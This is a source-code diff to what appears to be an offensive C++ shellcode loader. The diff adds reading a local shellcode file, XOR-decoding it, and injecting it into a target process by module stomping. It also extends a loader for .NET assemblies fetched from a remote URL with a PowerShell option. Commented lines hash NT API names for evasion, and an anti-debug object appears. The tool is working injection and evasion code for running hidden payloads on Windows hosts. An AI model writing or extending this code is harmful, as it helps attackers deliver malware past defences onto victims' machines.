@@ -200,6 +200,7 @@ void InvokeDllMain(HMODULE hMappedModule) {
 }
 //debug antiDebug;
 int main(int argc, char* argv[]) {
+   
     /*
     std::vector<unsigned char> buff = ReadFileToBuffer("hello.dll");
     std::cout << "hello.dll size: " << buff.size() << "\n";
@@ -212,18 +213,21 @@ int main(int argc, char* argv[]) {
     };
     */
     try {
+        //std::cout << "NtCreateSection: " << helperHandler.simpleHash("NtCreateSection") << std::endl;
+        //std::cout << "NtMapViewOfSection: " << helperHandler.simpleHash("NtMapViewOfSection") << std::endl;
         helper::Options opt = helperHandler.parseArgs(argc, argv);
 
         //std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
         if (opt.mode == "dotnet") {
             //std::wcout << "Parsed options - path: " << opt.filePath << ", args: " << opt.args << "\n";
             if(opt.useRemote){
+                
                 std::cout << "[+] Remote dotnet\n";
 				std::wstring url = opt.url + opt.file;
-                InitDotnet(url, true, opt.args, opt.https);
+                InitDotnet(url, true, opt.args, opt.https, opt.powershell);
 			}
             else {
-                InitDotnet(opt.filePath, false, opt.args, opt.https);
+                InitDotnet(opt.filePath, false, opt.args, opt.https, opt.powershell);
             }
             
             std::cout << "Press Enter to exit...";
@@ -260,10 +264,30 @@ int main(int argc, char* argv[]) {
         }
 
         else {
+            if (!opt.filePath.empty()) {
+                std::wcout << "[+] Reading local shellcode from: " << opt.filePath << "\n";
+
+                // You'll need a helper function to read the file into a vector
+                shellcode_vector = helperHandler.readLocalFile(opt.filePath);
+
+                if (shellcode_vector.empty()) {
+                    std::cout << "[-] Failed to read local file or file is empty.\n";
+                    return 1;
+                }
+
+                // Apply XOR decoding if a key was provided
+                if (opt.key != 0x00) {
+                    std::cout << "[+] Decoding local shellcode with key: " << (int)opt.key << "\n";
+                    helperHandler.xor_shellcode(shellcode_vector.data(), shellcode_vector.size(), opt.key);
+                }
+            }
+            else {
+                helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
+            }
 
 
 
-            helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
+            
         }
         std::cout << "pid: " << opt.pid << "\n";
 
@@ -285,8 +309,8 @@ int main(int argc, char* argv[]) {
         }
         else if (opt.method == "stomp") {
             moduleStomping(process_id,
-                shellcode,
-                shellcode_len);
+                shellcode_vector.data(),
+                shellcode_vector.size());
         }
         std::cout << "Press Enter to exit...";
         std::cin.get();
